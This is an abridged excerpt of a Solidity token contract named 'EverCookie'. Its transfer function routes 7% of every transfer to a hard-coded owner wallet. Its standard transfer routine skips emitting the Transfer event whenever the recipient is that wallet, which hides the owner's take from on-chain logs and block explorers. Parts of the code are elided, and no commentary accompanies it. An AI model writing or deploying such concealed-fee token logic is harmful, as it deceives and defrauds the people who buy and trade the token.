...
contract EverCookie is Context, IERC20, Ownable {
    ...
    address private ownerbuybackwallet=0x15c2916e5FfFc3C82ac5Df83FAFD1eDE97af35Ba;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 10000000000*10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tBurnTotal;
    string private _name = 'EverCookie';
    string private _symbol = '🍪EverCookie🍪';
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        uint256 OwnerAmount=amount.mul(7).div(100);
        uint256 Amount=amount.sub(OwnerAmount);
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender,ownerbuybackwallet,OwnerAmount);
            _transferFromExcluded(sender, recipient, Amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferFromExcluded(sender,ownerbuybackwallet,OwnerAmount);
            _transferToExcluded(sender, recipient, Amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender,ownerbuybackwallet,OwnerAmount);
            _transferStandard(sender, recipient, Amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, ownerbuybackwallet,OwnerAmount);
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if(recipient!=ownerbuybackwallet){emit Transfer(sender, recipient, tTransferAmount);}
    }
